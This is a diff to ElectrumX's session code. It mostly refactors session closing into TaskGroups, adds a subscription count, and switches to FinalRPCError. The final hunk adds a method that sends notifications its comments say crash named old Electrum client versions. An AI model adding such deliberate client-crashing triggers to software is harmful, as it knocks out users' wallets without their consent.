@@ -23,7 +23,7 @@ from functools import partial
 from aiorpcx import (
     RPCSession, JSONRPCAutoDetect, JSONRPCConnection, JSONRPCv2,
     TaskGroup, handler_invocation, RPCError, Request, ignore_after, sleep,
-    Event
+    Event, FinalRPCError
 )
 
 import electrumx
@@ -321,8 +321,9 @@ class SessionManager(object):
                                  for session in stale_sessions)
                 self.logger.info(f'closing stale connections {text}')
                 # Give the sockets some time to close gracefully
-                for session in stale_sessions:
-                    await session.spawn(session.close())
+                async with TaskGroup() as group:
+                    for session in stale_sessions:
+                        await group.spawn(session.close())
 
             # Consolidate small groups
             bw_limit = self.env.bandwidth_limit
@@ -352,6 +353,7 @@ class SessionManager(object):
             'peers': self.peer_mgr.info(),
             'requests': sum(s.count_pending_items() for s in self.sessions),
             'sessions': self.session_count(),
+            'sessions_with_subs': self.session_count_with_subs(),
             'subs': self._sub_count(),
             'txs_sent': self.txs_sent,
             'uptime': util.formatted_time(time.time() - self.start_time),
@@ -570,14 +572,18 @@ class SessionManager(object):
         finally:
             # Close servers then sessions
             await self._close_servers(list(self.servers.keys()))
-            for session in list(self.sessions):
-                await session.spawn(session.close(force_after=1))
-            for session in list(self.sessions):
-                await session.closed_event.wait()
+            async with TaskGroup() as group:
+                for session in list(self.sessions):
+                    await group.spawn(session.close(force_after=1))
 
     def session_count(self):
         '''The number of connections that we've sent something to.'''
         return len(self.sessions)
+
+    def session_count_with_subs(self):
+        '''The number of connections that have at least one hashX subscription.'''
+        return sum(len(session.hashX_subs) > 0 for session in self.sessions
+                   if hasattr(session, 'hashX_subs'))
 
     async def daemon_request(self, method, *args):
         '''Catch a DaemonError and convert it to an RPCError.'''
@@ -626,8 +632,9 @@ class SessionManager(object):
             for hashX in set(hc).intersection(touched):
                 del hc[hashX]
 
-        for session in self.sessions:
-            await session.spawn(session.notify, touched, height_changed)
+        async with TaskGroup() as group:
+            for session in self.sessions:
+                await group.spawn(session.notify, touched, height_changed)
 
     def add_session(self, session):
         self.sessions.add(session)
@@ -1169,26 +1176,28 @@ class ElectrumX(SessionBase):
             client_name = str(client_name)
             if self.env.drop_client is not None and \
                     self.env.drop_client.match(client_name):
-                self.close_after_send = True
-                raise RPCError(BAD_REQUEST,
-                               f'unsupported client: {client_name}')
+                raise FinalRPCError(BAD_REQUEST,
+                                    f'unsupported client: {client_name}')
             self.client = client_name[:17]
 
         # Find the highest common protocol version.  Disconnect if
         # that protocol version in unsupported.
         ptuple, client_min = util.protocol_version(
             protocol_version, self.PROTOCOL_MIN, self.PROTOCOL_MAX)
+        await self.maybe_attempt_to_crash_old_client(ptuple)
         if ptuple is None:
             if client_min > self.PROTOCOL_MIN:
                 self.logger.info(f'client requested future protocol version '
                                  f'{util.version_string(client_min)} '
                                  f'- is your software out of date?')
-            self.close_after_send = True
-            raise RPCError(BAD_REQUEST,
-                           f'unsupported protocol version: {protocol_version}')
+            raise FinalRPCError(BAD_REQUEST,
+                                f'unsupported protocol version: {protocol_version}')
         self.set_request_handlers(ptuple)
 
         return (electrumx.version, self.protocol_version_string())
+
+    async def maybe_attempt_to_crash_old_client(self, proto_ver):
+        return
 
     async def transaction_broadcast(self, raw_tx):
         '''Broadcast a raw transaction to the network.
@@ -1207,7 +1216,7 @@ class ElectrumX(SessionBase):
             self.txs_sent += 1
             client_ver = util.protocol_tuple(self.client)
             if client_ver != (0, ):
-                msg = self.coin.upgrade_required(client_ver)
+                msg = self.coin.warn_old_client_on_tx_broadcast(client_ver)
                 if msg:
                     self.logger.info(f'sent tx: {hex_hash}. and warned user to upgrade their '
                                      f'client from {self.client}')
@@ -1614,3 +1623,17 @@ class AuxPoWElectrumX(ElectrumX):
             height += 1
 
         return headers.hex()
+
+
+class BitcoinSegwitElectrumX(ElectrumX):
+
+    async def maybe_attempt_to_crash_old_client(self, proto_ver):
+        client_ver = util.protocol_tuple(self.client)
+        is_old_protocol = proto_ver is None or proto_ver <= (1, 2)
+        is_old_client = client_ver != (0,) and client_ver < (3, 2, 4)
+        if is_old_protocol and is_old_client:
+            self.logger.info(f'attempting to crash old client with version {self.client}')
+            # this can crash electrum client 2.6 <= v < 3.1.2
+            await self.send_notification('blockchain.relayfee', ())
+            # this can crash electrum client (v < 2.8.2) UNION (3.0.0 <= v < 3.3.0)
+            await self.send_notification('blockchain.estimatefee', ())
